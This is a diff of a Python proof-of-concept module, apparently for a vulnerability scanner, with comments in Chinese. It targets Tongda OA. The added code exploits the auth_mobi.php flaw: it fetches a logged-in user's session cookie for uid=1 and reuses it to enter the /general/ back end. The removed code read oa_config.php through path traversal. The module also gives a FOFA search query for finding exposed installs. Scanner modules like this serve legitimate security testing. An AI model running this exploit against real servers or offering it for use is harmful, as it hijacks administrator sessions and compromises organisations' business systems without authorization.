@@ -14,24 +14,23 @@ class POC(POCBase):
         "CreateDate" : "2022-01-01",        # POC创建时间
         "UpdateDate" : "2022-01-01",        # POC创建时间
         "PocDesc" : """
-        略  
+            略
         """,                                # POC描述，写更新描述，没有就不写
 
-        "name" : "通达OA_v2017/极限OA video_file.php 任意文件下载漏洞",                        # 漏洞名称
+        "name" : "通达OA < v11.7 auth_mobi.php 在线用户登录漏洞",                        # 漏洞名称
         "VulnID" : "oFx-2022-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
         "AppName" : "通达OA",                     # 漏洞应用名称
-        "AppVersion" : "v2017",                  # 漏洞应用版本
+        "AppVersion" : "通达OA < 11.7",                  # 漏洞应用版本
         "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
         "VulnDesc" : """
-            通达OA（OfficeAnywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。
-            通达存在任意文件下载漏洞，攻击者可以通过指定接口下载任意文件，获取数据库管理权限。
-
-            极限OA video_file.php存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器敏感文件
+            通达OA（OfficeAnywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，
+            是与中国企业管理实践相结合形成的综合管理办公平台。
+            
+            通达存在任意用户登录漏洞，攻击者可以通过指定接口查询在线用户并获取cookie，导致业务后台失陷。
         """,                                # 漏洞简要描述
 
         "fofa-dork":"""
             app="TDXK-通达OA"
-            icon_hash="1967132225"
         """,                     # fofa搜索语句
         "example" : "",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
@@ -46,8 +45,8 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
-        url = self.target + "/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php" # url自己按需调整
-        
+        url0 = self.target + "/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0" # url自己按需调整
+        url1 = self.target + "/general/"
 
         headers = {
                     "User-Agent":get_random_ua(),
@@ -59,12 +58,15 @@ class POC(POCBase):
             """
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
-            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if "$MYSQL_SERVER=\"" in req.text and "$MYSQL_USER=\"" in req.text and "$ROOT_PATH=getenv(\"DOCUMENT_ROOT\");" in req.text \
-                and req.status_code == 200 :
-                vuln = [True,req.text]
+            req0 = requests.get(url0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False,allow_redirects=False)
+            if req0.status_code == 200 and "PHPSESSID" in req0.headers["Set-Cookie"] and len(req0.text.strip()) == 0:
+                cookie = req0.headers["Set-Cookie"].split(";")[0].strip()
+                headers["Cookie"] = cookie
+                req1 = requests.get(url1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False,allow_redirects=False)
+                if req1.status_code == 200 and "<!--[if IE 6 ]> <html class=\"ie6 lte_ie6 lte_ie7 lte_ie8 lte_ie9\"> <![endif]-->" in req1.text:
+                    vuln = [True,"<title> Url: %s | Cookie: %s </title>" % (url1,cookie)]
             else:
-                vuln = [False,req.text]
+                vuln = [False,req0.text]
         except Exception as e:
             raise e
         
